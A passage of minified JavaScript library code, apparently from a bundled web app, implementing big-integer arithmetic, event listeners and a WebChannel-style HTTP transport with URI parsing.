w<0?0:w<this.g.length?this.g[w]:this.h};function R(w){if(w.h!=0)return!1;for(let I=0;I<w.g.length;I++)if(w.g[I]!=0)return!1;return!0}function L(w){return w.h==-1}a.l=function(w){return w=D(this,w),L(w)?-1:R(w)?0:1};function x(w){const I=w.g.length,k=[];for(let j=0;j<I;j++)k[j]=~w.g[j];return new c(k,~w.h).add(S)}a.abs=function(){return L(this)?x(this):this},a.add=function(w){const I=Math.max(this.g.length,w.g.length),k=[];let j=0;for(let _=0;_<=I;_++){let z=j+(this.i(_)&65535)+(w.i(_)&65535),N=(z>>>16)+(this.i(_)>>>16)+(w.i(_)>>>16);j=N>>>16,z&=65535,N&=65535,k[_]=N<<16|z}return new c(k,k[k.length-1]&-2147483648?-1:0)};function D(w,I){return w.add(x(I))}a.j=function(w){if(R(this)||R(w))return y;if(L(this))return L(w)?x(this).j(x(w)):x(x(this).j(w));if(L(w))return x(this.j(x(w)));if(this.l(A)<0&&w.l(A)<0)return p(this.m()*w.m());const I=this.g.length+w.g.length,k=[];for(var j=0;j<2*I;j++)k[j]=0;for(j=0;j<this.g.length;j++)for(let _=0;_<w.g.length;_++){const z=this.i(j)>>>16,N=this.i(j)&65535,ge=w.i(_)>>>16,me=w.i(_)&65535;k[2*j+2*_]+=N*me,G(k,2*j+2*_),k[2*j+2*_+1]+=z*me,G(k,2*j+2*_+1),k[2*j+2*_+1]+=N*ge,G(k,2*j+2*_+1),k[2*j+2*_+2]+=z*ge,G(k,2*j+2*_+2)}for(w=0;w<I;w++)k[w]=k[2*w+1]<<16|k[2*w];for(w=I;w<2*I;w++)k[w]=0;return new c(k,0)};function G(w,I){for(;(w[I]&65535)!=w[I];)w[I+1]+=w[I]>>>16,w[I]&=65535,I++}function B(w,I){this.g=w,this.h=I}function ee(w,I){if(R(I))throw Error("division by zero");if(R(w))return new B(y,y);if(L(w))return I=ee(x(w),I),new B(x(I.g),x(I.h));if(L(I))return I=ee(w,x(I)),new B(x(I.g),I.h);if(w.g.length>30){if(L(w)||L(I))throw Error("slowDivide_ only works with positive integers.");for(var k=S,j=I;j.l(w)<=0;)k=ue(k),j=ue(j);var _=Q(k,1),z=Q(j,1);for(j=Q(j,2),k=Q(k,2);!R(j);){var N=z.add(j);N.l(w)<=0&&(_=_.add(k),z=N),j=Q(j,1),k=Q(k,1)}return I=D(w,_.j(I)),new B(_,I)}for(_=y;w.l(I)>=0;){for(k=Math.max(1,Math.floor(w.m()/I.m())),j=Math.ceil(Math.log(k)/Math.LN2),j=j<=48?1:Math.pow(2,j-48),z=p(k),N=z.j(I);L(N)||N.l(w)>0;)k-=j,z=p(k),N=z.j(I);R(z)&&(z=S),_=_.add(z),w=D(w,N)}return new B(_,w)}a.B=function(w){return ee(this,w).h},a.and=function(w){const I=Math.max(this.g.length,w.g.length),k=[];for(let j=0;j<I;j++)k[j]=this.i(j)&w.i(j);return new c(k,this.h&w.h)},a.or=function(w){const I=Math.max(this.g.length,w.g.length),k=[];for(let j=0;j<I;j++)k[j]=this.i(j)|w.i(j);return new c(k,this.h|w.h)},a.xor=function(w){const I=Math.max(this.g.length,w.g.length),k=[];for(let j=0;j<I;j++)k[j]=this.i(j)^w.i(j);return new c(k,this.h^w.h)};function ue(w){const I=w.g.length+1,k=[];for(let j=0;j<I;j++)k[j]=w.i(j)<<1|w.i(j-1)>>>31;return new c(k,w.h)}function Q(w,I){const k=I>>5;I%=32;const j=w.g.length-k,_=[];for(let z=0;z<j;z++)_[z]=I>0?w.i(z+k)>>>I|w.i(z+k+1)<<32-I:w.i(z+k);return new c(_,w.h)}o.prototype.digest=o.prototype.A,o.prototype.reset=o.prototype.u,o.prototype.update=o.prototype.v,oT=o,c.prototype.add=c.prototype.add,c.prototype.multiply=c.prototype.j,c.prototype.modulo=c.prototype.B,c.prototype.compare=c.prototype.l,c.prototype.toNumber=c.prototype.m,c.prototype.toString=c.prototype.toString,c.prototype.getBits=c.prototype.i,c.fromNumber=p,c.fromString=v,Ji=c}).apply(typeof AC<"u"?AC:typeof self<"u"?self:typeof window<"u"?window:{});var Kd=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};var iT,_c,rT,up,gg,sT,lT,cT;(function(){var a,e=Object.defineProperty;function t(m){m=[typeof globalThis=="object"&&globalThis,m,typeof window=="object"&&window,typeof self=="object"&&self,typeof Kd=="object"&&Kd];for(var E=0;E<m.length;++E){var T=m[E];if(T&&T.Math==Math)return T}throw Error("Cannot find global object")}var o=t(this);function r(m,E){if(E)e:{var T=o;m=m.split(".");for(var q=0;q<m.length-1;q++){var $=m[q];if(!($ in T))break e;T=T[$]}m=m[m.length-1],q=T[m],E=E(q),E!=q&&E!=null&&e(T,m,{configurable:!0,writable:!0,value:E})}}r("Symbol.dispose",function(m){return m||Symbol("Symbol.dispose")}),r("Array.prototype.values",function(m){return m||function(){return this[Symbol.iterator]()}}),r("Object.entries",function(m){return m||function(E){var T=[],q;for(q in E)Object.prototype.hasOwnProperty.call(E,q)&&T.push([q,E[q]]);return T}});var l=l||{},c=this||self;function d(m){var E=typeof m;return E=="object"&&m!=null||E=="function"}function f(m,E,T){return m.call.apply(m.bind,arguments)}function p(m,E,T){return p=f,p.apply(null,arguments)}function v(m,E){var T=Array.prototype.slice.call(arguments,1);return function(){var q=T.slice();return q.push.apply(q,arguments),m.apply(this,q)}}function y(m,E){function T(){}T.prototype=E.prototype,m.Z=E.prototype,m.prototype=new T,m.prototype.constructor=m,m.Ob=function(q,$,te){for(var be=Array(arguments.length-2),ze=2;ze<arguments.length;ze++)be[ze-2]=arguments[ze];return E.prototype[$].apply(q,be)}}var S=typeof AsyncContext<"u"&&typeof AsyncContext.Snapshot=="function"?m=>m&&AsyncContext.Snapshot.wrap(m):m=>m;function A(m){const E=m.length;if(E>0){const T=Array(E);for(let q=0;q<E;q++)T[q]=m[q];return T}return[]}function R(m,E){for(let q=1;q<arguments.length;q++){const $=arguments[q];var T=typeof $;if(T=T!="object"?T:$?Array.isArray($)?"array":T:"null",T=="array"||T=="object"&&typeof $.length=="number"){T=m.length||0;const te=$.length||0;m.length=T+te;for(let be=0;be<te;be++)m[T+be]=$[be]}else m.push($)}}class L{constructor(E,T){this.i=E,this.j=T,this.h=0,this.g=null}get(){let E;return this.h>0?(this.h--,E=this.g,this.g=E.next,E.next=null):E=this.i(),E}}function x(m){c.setTimeout(()=>{throw m},0)}function D(){var m=w;let E=null;return m.g&&(E=m.g,m.g=m.g.next,m.g||(m.h=null),E.next=null),E}class G{constructor(){this.h=this.g=null}add(E,T){const q=B.get();q.set(E,T),this.h?this.h.next=q:this.g=q,this.h=q}}var B=new L(()=>new ee,m=>m.reset());class ee{constructor(){this.next=this.g=this.h=null}set(E,T){this.h=E,this.g=T,this.next=null}reset(){this.next=this.g=this.h=null}}let ue,Q=!1,w=new G,I=()=>{const m=Promise.resolve(void 0);ue=()=>{m.then(k)}};function k(){for(var m;m=D();){try{m.h.call(m.g)}catch(T){x(T)}var E=B;E.j(m),E.h<100&&(E.h++,m.next=E.g,E.g=m)}Q=!1}function j(){this.u=this.u,this.C=this.C}j.prototype.u=!1,j.prototype.dispose=function(){this.u||(this.u=!0,this.N())},j.prototype[Symbol.dispose]=function(){this.dispose()},j.prototype.N=function(){if(this.C)for(;this.C.length;)this.C.shift()()};function _(m,E){this.type=m,this.g=this.target=E,this.defaultPrevented=!1}_.prototype.h=function(){this.defaultPrevented=!0};var z=(function(){if(!c.addEventListener||!Object.defineProperty)return!1;var m=!1,E=Object.defineProperty({},"passive",{get:function(){m=!0}});try{const T=()=>{};c.addEventListener("test",T,E),c.removeEventListener("test",T,E)}catch{}return m})();function N(m){return/^[\s\xa0]*$/.test(m)}function ge(m,E){_.call(this,m?m.type:""),this.relatedTarget=this.g=this.target=null,this.button=this.screenY=this.screenX=this.clientY=this.clientX=0,this.key="",this.metaKey=this.shiftKey=this.altKey=this.ctrlKey=!1,this.state=null,this.pointerId=0,this.pointerType="",this.i=null,m&&this.init(m,E)}y(ge,_),ge.prototype.init=function(m,E){const T=this.type=m.type,q=m.changedTouches&&m.changedTouches.length?m.changedTouches[0]:null;this.target=m.target||m.srcElement,this.g=E,E=m.relatedTarget,E||(T=="mouseover"?E=m.fromElement:T=="mouseout"&&(E=m.toElement)),this.relatedTarget=E,q?(this.clientX=q.clientX!==void 0?q.clientX:q.pageX,this.clientY=q.clientY!==void 0?q.clientY:q.pageY,this.screenX=q.screenX||0,this.screenY=q.screenY||0):(this.clientX=m.clientX!==void 0?m.clientX:m.pageX,this.clientY=m.clientY!==void 0?m.clientY:m.pageY,this.screenX=m.screenX||0,this.screenY=m.screenY||0),this.button=m.button,this.key=m.key||"",this.ctrlKey=m.ctrlKey,this.altKey=m.altKey,this.shiftKey=m.shiftKey,this.metaKey=m.metaKey,this.pointerId=m.pointerId||0,this.pointerType=m.pointerType,this.state=m.state,this.i=m,m.defaultPrevented&&ge.Z.h.call(this)},ge.prototype.h=function(){ge.Z.h.call(this);const m=this.i;m.preventDefault?m.preventDefault():m.returnValue=!1};var me="closure_listenable_"+(Math.random()*1e6|0),K=0;function pe(m,E,T,q,$){this.listener=m,this.proxy=null,this.src=E,this.type=T,this.capture=!!q,this.ha=$,this.key=++K,this.da=this.fa=!1}function ye(m){m.da=!0,m.listener=null,m.proxy=null,m.src=null,m.ha=null}function Me(m,E,T){for(const q in m)E.call(T,m[q],q,m)}function U(m,E){for(const T in m)E.call(void 0,m[T],T,m)}function H(m){const E={};for(const T in m)E[T]=m[T];return E}const oe="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");function M(m,E){let T,q;for(let $=1;$<arguments.length;$++){q=arguments[$];for(T in q)m[T]=q[T];for(let te=0;te<oe.length;te++)T=oe[te],Object.prototype.hasOwnProperty.call(q,T)&&(m[T]=q[T])}}function ve(m){this.src=m,this.g={},this.h=0}ve.prototype.add=function(m,E,T,q,$){const te=m.toString();m=this.g[te],m||(m=this.g[te]=[],this.h++);const be=Ae(m,E,q,$);return be>-1?(E=m[be],T||(E.fa=!1)):(E=new pe(E,this.src,te,!!q,$),E.fa=T,m.push(E)),E};function je(m,E){const T=E.type;if(T in m.g){var q=m.g[T],$=Array.prototype.indexOf.call(q,E,void 0),te;(te=$>=0)&&Array.prototype.splice.call(q,$,1),te&&(ye(E),m.g[T].length==0&&(delete m.g[T],m.h--))}}function Ae(m,E,T,q){for(let $=0;$<m.length;++$){const te=m[$];if(!te.da&&te.listener==E&&te.capture==!!T&&te.ha==q)return $}return-1}var Oe="closure_lm_"+(Math.random()*1e6|0),sa={};function ta(m,E,T,q,$){if(Array.isArray(E)){for(let te=0;te<E.length;te++)ta(m,E[te],T,q,$);return null}return T=Ao(T),m&&m[me]?m.J(E,T,d(q)?!!q.capture:!1,$):Pe(m,E,T,!1,q,$)}function Pe(m,E,T,q,$,te){if(!E)throw Error("Invalid event type");const be=d($)?!!$.capture:!!$;let ze=tn(m);if(ze||(m[Oe]=ze=new ve(m)),T=ze.add(E,T,q,be,te),T.proxy)return T;if(q=Pt(),T.proxy=q,q.src=m,q.listener=T,m.addEventListener)z||($=be),$===void 0&&($=!1),m.addEventListener(E.toString(),q,$);else if(m.attachEvent)m.attachEvent(ht(E.toString()),q);else if(m.addListener&&m.removeListener)m.addListener(q);else throw Error("addEventListener and attachEvent are unavailable.");return T}function Pt(){function m(T){return E.call(m.src,m.listener,T)}const E=an;return m}function Vn(m,E,T,q,$){if(Array.isArray(E))for(var te=0;te<E.length;te++)Vn(m,E[te],T,q,$);else q=d(q)?!!q.capture:!!q,T=Ao(T),m&&m[me]?(m=m.i,te=String(E).toString(),te in m.g&&(E=m.g[te],T=Ae(E,T,q,$),T>-1&&(ye(E[T]),Array.prototype.splice.call(E,T,1),E.length==0&&(delete m.g[te],m.h--)))):m&&(m=tn(m))&&(E=m.g[E.toString()],m=-1,E&&(m=Ae(E,T,q,$)),(T=m>-1?E[m]:null)&&Fn(T))}function Fn(m){if(typeof m!="number"&&m&&!m.da){var E=m.src;if(E&&E[me])je(E.i,m);else{var T=m.type,q=m.proxy;E.removeEventListener?E.removeEventListener(T,q,m.capture):E.detachEvent?E.detachEvent(ht(T),q):E.addListener&&E.removeListener&&E.removeListener(q),(T=tn(E))?(je(T,m),T.h==0&&(T.src=null,E[Oe]=null)):ye(m)}}}function ht(m){return m in sa?sa[m]:sa[m]="on"+m}function an(m,E){if(m.da)m=!0;else{E=new ge(E,this);const T=m.listener,q=m.ha||m.src;m.fa&&Fn(m),m=T.call(q,E)}return m}function tn(m){return m=m[Oe],m instanceof ve?m:null}var Hn="__closure_events_fn_"+(Math.random()*1e9>>>0);function Ao(m){return typeof m=="function"?m:(m[Hn]||(m[Hn]=function(E){return m.handleEvent(E)}),m[Hn])}function Fe(){j.call(this),this.i=new ve(this),this.M=this,this.G=null}y(Fe,j),Fe.prototype[me]=!0,Fe.prototype.removeEventListener=function(m,E,T,q){Vn(this,m,E,T,q)};function ia(m,E){var T,q=m.G;if(q)for(T=[];q;q=q.G)T.push(q);if(m=m.M,q=E.type||E,typeof E=="string")E=new _(E,m);else if(E instanceof _)E.target=E.target||m;else{var $=E;E=new _(q,m),M(E,$)}$=!0;let te,be;if(T)for(be=T.length-1;be>=0;be--)te=E.g=T[be],$=Ut(te,q,!0,E)&&$;if(te=E.g=m,$=Ut(te,q,!0,E)&&$,$=Ut(te,q,!1,E)&&$,T)for(be=0;be<T.length;be++)te=E.g=T[be],$=Ut(te,q,!1,E)&&$}Fe.prototype.N=function(){if(Fe.Z.N.call(this),this.i){var m=this.i;for(const E in m.g){const T=m.g[E];for(let q=0;q<T.length;q++)ye(T[q]);delete m.g[E],m.h--}}this.G=null},Fe.prototype.J=function(m,E,T,q){return this.i.add(String(m),E,!1,T,q)},Fe.prototype.K=function(m,E,T,q){return this.i.add(String(m),E,!0,T,q)};function Ut(m,E,T,q){if(E=m.i.g[String(E)],!E)return!0;E=E.concat();let $=!0;for(let te=0;te<E.length;++te){const be=E[te];if(be&&!be.da&&be.capture==T){const ze=be.listener,ka=be.ha||be.src;be.fa&&je(m.i,be),$=ze.call(ka,q)!==!1&&$}}return $&&!q.defaultPrevented}function sr(m,E){if(typeof m!="function")if(m&&typeof m.handleEvent=="function")m=p(m.handleEvent,m);else throw Error("Invalid listener argument");return Number(E)>2147483647?-1:c.setTimeout(m,E||0)}function ii(m){m.g=sr(()=>{m.g=null,m.i&&(m.i=!1,ii(m))},m.l);const E=m.h;m.h=null,m.m.apply(null,E)}class Ua extends j{constructor(E,T){super(),this.m=E,this.l=T,this.h=null,this.i=!1,this.g=null}j(E){this.h=arguments,this.g?this.i=!0:ii(this)}N(){super.N(),this.g&&(c.clearTimeout(this.g),this.g=null,this.i=!1,this.h=null)}}function nn(m){j.call(this),this.h=m,this.g={}}y(nn,j);var O=[];function Z(m){Me(m.g,function(E,T){this.g.hasOwnProperty(T)&&Fn(E)},m),m.g={}}nn.prototype.N=function(){nn.Z.N.call(this),Z(this)},nn.prototype.handleEvent=function(){throw Error("EventHandler.handleEvent not implemented")};var fe=c.JSON.stringify,le=c.JSON.parse,Se=class{stringify(m){return c.JSON.stringify(m,void 0)}parse(m){return c.JSON.parse(m,void 0)}};function pa(){}function Ta(){}var ea={OPEN:"a",hb:"b",ERROR:"c",tb:"d"};function ra(){_.call(this,"d")}y(ra,_);function qa(){_.call(this,"c")}y(qa,_);var He={},Sn=null;function gt(){return Sn=Sn||new Fe}He.Ia="serverreachability";function xu(m){_.call(this,He.Ia,m)}y(xu,_);function Gn(m){const E=gt();ia(E,new xu(E))}He.STAT_EVENT="statevent";function lr(m,E){_.call(this,He.STAT_EVENT,m),this.stat=E}y(lr,_);function Ba(m){const E=gt();ia(E,new lr(E,m))}He.Ja="timingevent";function Jn(m,E){_.call(this,He.Ja,m),this.size=E}y(Jn,_);function Qn(m,E){if(typeof m!="function")throw Error("Fn must not be null and must be a function");return c.setTimeout(function(){m()},E)}function Cn(){this.g=!0}Cn.prototype.ua=function(){this.g=!1};function Tm(m,E,T,q,$,te){m.info(function(){if(m.g)if(te){var be="",ze=te.split("&");for(let ua=0;ua<ze.length;ua++){var ka=ze[ua].split("=");if(ka.length>1){const Ra=ka[0];ka=ka[1];const ln=Ra.split("_");be=ln.length>=2&&ln[1]=="type"?be+(Ra+"="+ka+"&"):be+(Ra+"=redacted&")}}}else be=null;else be=te;return"XMLHTTP REQ ("+q+") [attempt "+$+"]: "+E+`
`+T+`
`+be})}function ju(m,E,T,q,$,te,be){m.info(function(){return"XMLHTTP RESP ("+q+") [ attempt "+$+"]: "+E+`
`+T+`
`+te+" "+be})}function Wn(m,E,T,q){m.info(function(){return"XMLHTTP TEXT ("+E+"): "+xm(m,T)+(q?" "+q:"")})}function cr(m,E){m.info(function(){return"TIMEOUT: "+E})}Cn.prototype.info=function(){};function xm(m,E){if(!m.g)return E;if(!E)return null;try{const te=JSON.parse(E);if(te){for(m=0;m<te.length;m++)if(Array.isArray(te[m])){var T=te[m];if(!(T.length<2)){var q=T[1];if(Array.isArray(q)&&!(q.length<1)){var $=q[0];if($!="noop"&&$!="stop"&&$!="close")for(let be=1;be<q.length;be++)q[be]=""}}}}return fe(te)}catch{return E}}var ur={NO_ERROR:0,cb:1,qb:2,pb:3,kb:4,ob:5,rb:6,Ga:7,TIMEOUT:8,ub:9},Cl={ib:"complete",Fb:"success",ERROR:"error",Ga:"abort",xb:"ready",yb:"readystatechange",TIMEOUT:"timeout",sb:"incrementaldata",wb:"progress",lb:"downloadprogress",Nb:"uploadprogress"},Al;function dr(){}y(dr,pa),dr.prototype.g=function(){return new XMLHttpRequest},Al=new dr;function To(m){return encodeURIComponent(String(m))}function Pu(m){var E=1;m=m.split(":");const T=[];for(;E>0&&m.length;)T.push(m.shift()),E--;return m.length&&T.push(m.join(":")),T}function An(m,E,T,q){this.j=m,this.i=E,this.l=T,this.S=q||1,this.V=new nn(this),this.H=45e3,this.J=null,this.o=!1,this.u=this.B=this.A=this.M=this.F=this.T=this.D=null,this.G=[],this.g=null,this.C=0,this.m=this.v=null,this.X=-1,this.K=!1,this.P=0,this.O=null,this.W=this.L=this.U=this.R=!1,this.h=new Tn}function Tn(){this.i=null,this.g="",this.h=!1}var Va={},tt={};function Kn(m,E,T){m.M=1,m.A=pr(Ha(E)),m.u=T,m.R=!0,ts(m,null)}function ts(m,E){m.F=Date.now(),$n(m),m.B=Ha(m.A);var T=m.B,q=m.S;Array.isArray(q)||(q=[String(q)]),rs(T.i,"t",q),m.C=0,T=m.j.L,m.h=new Tn,m.g=Vu(m.j,T?E:null,!m.u),m.P>0&&(m.O=new Ua(p(m.Y,m,m.g),m.P)),E=m.V,T=m.g,q=m.ba;var $="readystatechange";Array.isArray($)||($&&(O[0]=$.toString()),$=O);for(let te=0;te<$.length;te++){const be=ta(T,$[te],q||E.handleEvent,!1,E.h||E);if(!be)break;E.g[be.key]=be}E=m.J?H(m.J):{},m.u?(m.v||(m.v="POST"),E["Content-Type"]="application/x-www-form-urlencoded",m.g.ea(m.B,m.v,m.u,E)):(m.v="GET",m.g.ea(m.B,m.v,null,E)),Gn(),Tm(m.i,m.v,m.B,m.l,m.S,m.u)}An.prototype.ba=function(m){m=m.target;const E=this.O;E&&Pn(m)==3?E.j():this.Y(m)},An.prototype.Y=function(m){try{if(m==this.g)e:{const ze=Pn(this.g),ka=this.g.ya(),ua=this.g.ca();if(!(ze<3)&&(ze!=3||this.g&&(this.h.h||this.g.la()||rt(this.g)))){this.K||ze!=4||ka==7||(ka==8||ua<=0?Gn(3):Gn(2)),Yn(this);var E=this.g.ca();this.X=E;var T=jm(this);if(this.o=E==200,ju(this.i,this.v,this.B,this.l,this.S,ze,E),this.o){if(this.U&&!this.L){a:{if(this.g){var q,$=this.g;if((q=$.g?$.g.getResponseHeader("X-HTTP-Initial-Response"):null)&&!N(q)){var te=q;break a}}te=null}if(m=te)Wn(this.i,this.l,m,"Initial handshake response via X-HTTP-Initial-Response"),this.L=!0,Xn(this,m);else{this.o=!1,this.m=3,Ba(12),Bt(this),on(this);break e}}if(this.R){m=!0;let Ra;for(;!this.K&&this.C<T.length;)if(Ra=Ru(this,T),Ra==tt){ze==4&&(this.m=4,Ba(14),m=!1),Wn(this.i,this.l,null,"[Incomplete Response]");break}else if(Ra==Va){this.m=4,Ba(15),Wn(this.i,this.l,T,"[Invalid Chunk]"),m=!1;break}else Wn(this.i,this.l,Ra,null),Xn(this,Ra);if(qu(this)&&this.C!=0&&(this.h.g=this.h.g.slice(this.C),this.C=0),ze!=4||T.length!=0||this.h.h||(this.m=1,Ba(16),m=!1),this.o=this.o&&m,!m)Wn(this.i,this.l,T,"[Invalid Chunked Response]"),Bt(this),on(this);else if(T.length>0&&!this.W){this.W=!0;var be=this.j;be.g==this&&be.aa&&!be.P&&(be.j.info("Great, no buffering proxy detected. Bytes received: "+T.length),Ol(be),be.P=!0,Ba(11))}}else Wn(this.i,this.l,T,null),Xn(this,T);ze==4&&Bt(this),this.o&&!this.K&&(ze==4?Ou(this.j,this):(this.o=!1,$n(this)))}else jo(this.g),E==400&&T.indexOf("Unknown SID")>0?(this.m=3,Ba(12)):(this.m=0,Ba(13)),Bt(this),on(this)}}}catch{}};function jm(m){if(!qu(m))return m.g.la();const E=rt(m.g);if(E==="")return"";let T="";const q=E.length,$=Pn(m.g)==4;if(!m.h.i){if(typeof TextDecoder>"u")return Bt(m),on(m),"";m.h.i=new c.TextDecoder}for(let te=0;te<q;te++)m.h.h=!0,T+=m.h.i.decode(E[te],{stream:!($&&te==q-1)});return E.length=0,m.h.g+=T,m.C=0,m.h.g}function qu(m){return m.g?m.v=="GET"&&m.M!=2&&m.j.Aa:!1}function Ru(m,E){var T=m.C,q=E.indexOf(`
`,T);return q==-1?tt:(T=Number(E.substring(T,q)),isNaN(T)?Va:(q+=1,q+T>E.length?tt:(E=E.slice(q,q+T),m.C=q+T,E)))}An.prototype.cancel=function(){this.K=!0,Bt(this)};function $n(m){m.T=Date.now()+m.H,ns(m,m.H)}function ns(m,E){if(m.D!=null)throw Error("WatchDog timer not null");m.D=Qn(p(m.aa,m),E)}function Yn(m){m.D&&(c.clearTimeout(m.D),m.D=null)}An.prototype.aa=function(){this.D=null;const m=Date.now();m-this.T>=0?(cr(this.i,this.B),this.M!=2&&(Gn(),Ba(17)),Bt(this),this.m=2,on(this)):ns(this,this.T-m)};function on(m){m.j.I==0||m.K||Ou(m.j,m)}function Bt(m){Yn(m);var E=m.O;E&&typeof E.dispose=="function"&&E.dispose(),m.O=null,Z(m.V),m.g&&(E=m.g,m.g=null,E.abort(),E.dispose())}function Xn(m,E){try{var T=m.j;if(T.I!=0&&(T.g==m||eo(T.h,m))){if(!m.L&&eo(T.h,m)&&T.I==3){try{var q=T.Ba.g.parse(E)}catch{q=null}if(Array.isArray(q)&&q.length==3){var $=q;if($[0]==0){e:if(!T.v){if(T.g)if(T.g.F+3e3<m.F)ds(T),mi(T);else break e;yr(T),Ba(18)}}else T.xa=$[1],0<T.xa-T.K&&$[2]<37500&&T.F&&T.A==0&&!T.C&&(T.C=Qn(p(T.Va,T),6e3));Zn(T.h)<=1&&T.ta&&(T.ta=void 0)}else ro(T,11)}else if((m.L||T.g==m)&&ds(T),!N(E))for($=T.Ba.g.parse(E),E=0;E<$.length;E++){let ua=$[E];const Ra=ua[0];if(!(Ra<=T.K))if(T.K=Ra,ua=ua[1],T.I==2)if(ua[0]=="c"){T.M=ua[1],T.ba=ua[2];const ln=ua[3];ln!=null&&(T.ka=ln,T.j.info("VER="+T.ka));const so=ua[4];so!=null&&(T.za=so,T.j.info("SVER="+T.za));const qn=ua[5];qn!=null&&typeof qn=="number"&&qn>0&&(q=1.5*qn,T.O=q,T.j.info("backChannelRequestTimeoutMs_="+q)),q=T;const Rn=m.g;if(Rn){const Er=Rn.g?Rn.g.getResponseHeader("X-Client-Wire-Protocol"):null;if(Er){var te=q.h;te.g||Er.indexOf("spdy")==-1&&Er.indexOf("quic")==-1&&Er.indexOf("h2")==-1||(te.j=te.l,te.g=new Set,te.h&&(jl(te,te.h),te.h=null))}if(q.G){const ps=Rn.g?Rn.g.getResponseHeader("X-HTTP-Session-Id"):null;ps&&(q.wa=ps,fa(q.J,q.G,ps))}}T.I=3,T.l&&T.l.ra(),T.aa&&(T.T=Date.now()-m.F,T.j.info("Handshake RTT: "+T.T+"ms")),q=T;var be=m;if(q.na=Bu(q,q.L?q.ba:null,q.W),be.L){Pl(q.h,be);var ze=be,ka=q.O;ka&&(ze.H=ka),ze.D&&(Yn(ze),$n(ze)),q.g=be}else ku(q);T.i.length>0&&io(T)}else ua[0]!="stop"&&ua[0]!="close"||ro(T,7);else T.I==3&&(ua[0]=="stop"||ua[0]=="close"?ua[0]=="stop"?ro(T,7):kl(T):ua[0]!="noop"&&T.l&&T.l.qa(ua),T.A=0)}}Gn(4)}catch{}}var Fa=class{constructor(m,E){this.g=m,this.map=E}};function Tl(m){this.l=m||10,c.PerformanceNavigationTiming?(m=c.performance.getEntriesByType("navigation"),m=m.length>0&&(m[0].nextHopProtocol=="hq"||m[0].nextHopProtocol=="h2")):m=!!(c.chrome&&c.chrome.loadTimes&&c.chrome.loadTimes()&&c.chrome.loadTimes().wasFetchedViaSpdy),this.j=m?this.l:1,this.g=null,this.j>1&&(this.g=new Set),this.h=null,this.i=[]}function xl(m){return m.h?!0:m.g?m.g.size>=m.j:!1}function Zn(m){return m.h?1:m.g?m.g.size:0}function eo(m,E){return m.h?m.h==E:m.g?m.g.has(E):!1}function jl(m,E){m.g?m.g.add(E):m.h=E}function Pl(m,E){m.h&&m.h==E?m.h=null:m.g&&m.g.has(E)&&m.g.delete(E)}Tl.prototype.cancel=function(){if(this.i=ql(this),this.h)this.h.cancel(),this.h=null;else if(this.g&&this.g.size!==0){for(const m of this.g.values())m.cancel();this.g.clear()}};function ql(m){if(m.h!=null)return m.i.concat(m.h.G);if(m.g!=null&&m.g.size!==0){let E=m.i;for(const T of m.g.values())E=E.concat(T.G);return E}return A(m.i)}var Lu=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");function os(m,E){if(m){m=m.split("&");for(let T=0;T<m.length;T++){const q=m[T].indexOf("=");let $,te=null;q>=0?($=m[T].substring(0,q),te=m[T].substring(q+1)):$=m[T],E($,te?decodeURIComponent(te.replace(/\+/g," ")):"")}}}function Vt(m){this.g=this.o=this.j="",this.u=null,this.m=this.h="",this.l=!1;let E;m instanceof Vt?(this.l=m.l,nt(this,m.j),this.o=m.o,this.g=m.g,ri(this,m.u),this.h=m.h,Rl(this,Mu(m.i)),this.m=m.m):m&&(E=String(m).match(Lu))?(this.l=!1,nt(this,E[1]||"",!0),this.o=ao(E[2]||""),this.g=ao(E[3]||"",!0),ri(this,E[4]),this.h=ao(E[5]||"",!0),Rl(this,E[6]||"",!0),this.m=ao(E[7]||"")):(this.l=!1,this.i=new li(null,this.l))}Vt.prototype.toString=function(){const m=[];var E=this.j;E&&m.push(mr(E,is,!0),":");var T=this.g;return(T||E=="file")&&(m.push("//"),(E=this.o)&&m.push(mr(E,is,!0),"@"),m.push(To(T).replace(/%25([0-9a-fA-F]{2})/g,"%$1")),T=this.u,T!=null&&m.push(":",String(T))),(T=this.h)&&(this.g&&T.charAt(0)!="/"&&m.push("/"),m.push(mr(T,T.charAt(0)=="/"?Ll:Iu,!0))),(T=this.i.toString())&&m.push("?",T),(T=this.m)&&m.push("#",mr(T,Du)),m.join("")},Vt.prototype.resolve=function(m){const E=Ha(this);let T=!!m.j;T?nt(E,m.j):T=!!m.o,T?E.o=m.o:T=!!m.g,T?E.g=m.g:T=m.u!=null;var q=m.h;if(T)ri(E,m.u);else if(T=!!m.h){if(q.charAt(0)!="/")if(this.g&&!this.h)q="/"+q;else{var $=E.h.lastIndexOf("/");$!=-1&&(q=E.h.slice(0,$+1)+q)}if($=q,$==".."||$==".")q="";else if($.indexOf("./")!=-1||$.indexOf("/.")!=-1){q=$.lastIndexOf("/",0)==0,$=$.split("/");const te=[];for(let be=0;be<$.length;){const ze=$[be++];ze=="."?q&&be==$.length&&te.push(""):ze==".."?((te.length>1||te.length==1&&te[0]!="")&&te.pop(),q&&be==$.length&&te.push("")):(te.push(ze),q=!0)}q=te.join("/")}else q=$}return T?E.h=q:T=m.i.toString()!=="",T?Rl(E,Mu(m.i)):T=!!m.m,T&&(E.m=m.m),E};function Ha(m){return new Vt(m)}function nt(m,E,T){m.j=T?ao(E,!0):E,m.j&&(m.j=m.j.replace(/:$/,""))}function ri(m,E){if(E){if(E=Number(E),isNaN(E)||E<0)throw Error("Bad port number "+E);m.u=E}else m.u=null}function Rl(m,E,T){E instanceof li?(m.i=E,ss(m.i,m.l)):(T||(E=mr(E,si)),m.i=new li(E,m.l))}function fa(m,E,T){m.i.set(E,T)}function pr(m){return fa(m,"zx",Math.floor(Math.random()*2147483648).toString(36)+Math.abs(Math.floor(Math.random()*2147483648)^Date.now()).toString(36)),m}function ao(m,E){return m?E?decodeURI(m.replace(/%25/g,"%2525")):decodeURIComponent(m):""}function mr(m,E,T){return typeof m=="string"?(m=encodeURI(m).replace(E,qt),T&&(m=m.replace(/%25([0-9a-fA-F]{2})/g,"%$1")),m):null}function qt(m){return m=m.charCodeAt(0),"%"+(m>>4&15).toString(16)+(m&15).toString(16)}var is=/[#\/\?@]/g,Iu=/[#\?:]/g,Ll=/[#\?]/g,si=/[#\?@]/g,Du=/#/g;function 